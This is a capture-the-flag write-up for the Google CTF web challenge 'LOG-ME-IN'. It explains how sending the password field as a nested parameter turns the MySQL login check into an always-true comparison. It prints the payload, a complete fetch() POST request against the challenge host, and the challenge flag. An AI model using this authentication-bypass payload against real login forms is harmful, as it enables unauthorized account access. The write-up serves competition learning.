# LOG-ME-IN
*Solution and write-up by team [Kalmarunionen](https://capturetheflag.withgoogle.com/scoreboard/kalmarunionen).*

This challenge exploits the fact that we can send an array which when parsed makes the MySQL server execute a query similar to the following:
```
SELECT * FROM users WHERE username='michelle' AND password=`password`='1'
``` 

Hence payload for the request is simply: `username=michelle&password[password]=1&csrf=`

Exploit:
```
await fetch("https://log-me-in.web.ctfcompetition.com/login", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    },
    "referrer": "https://log-me-in.web.ctfcompetition.com/login",
    "body": "username=michelle&password[password]=1&csrf=",
    "method": "POST",
    "mode": "cors"
});
```

After logging in, it is easy to just go and grab the flag.

Flag: `CTF{a-premium-effort-deserves-a-premium-flag}`
